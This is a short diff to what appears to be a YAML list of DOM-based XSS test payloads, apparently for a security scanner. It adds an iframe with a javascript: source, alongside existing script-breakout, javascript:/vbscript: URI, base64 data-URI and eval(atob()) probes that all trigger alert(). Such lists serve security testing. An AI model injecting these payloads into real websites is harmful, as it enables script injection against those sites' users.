@@ -282,6 +282,7 @@ dom_xss:
     - "</script><script>alert('DOMXSS')</script>"
     - "javascript:alert('DOMXSS')"
     - "javascript://%250Aalert('DOMXSS')"
+    - '<iframe src="javascript:alert(`XSS`)">'
     - "data:text/html;base64,PHNjcmlwdD5hbGVydCgnRE9NWFNTJyk8L3NjcmlwdD4="
     - "vbscript:alert('DOMXSS')"
     - "eval(atob('YWxlcnQoJ0RPTVhTUycp'))"
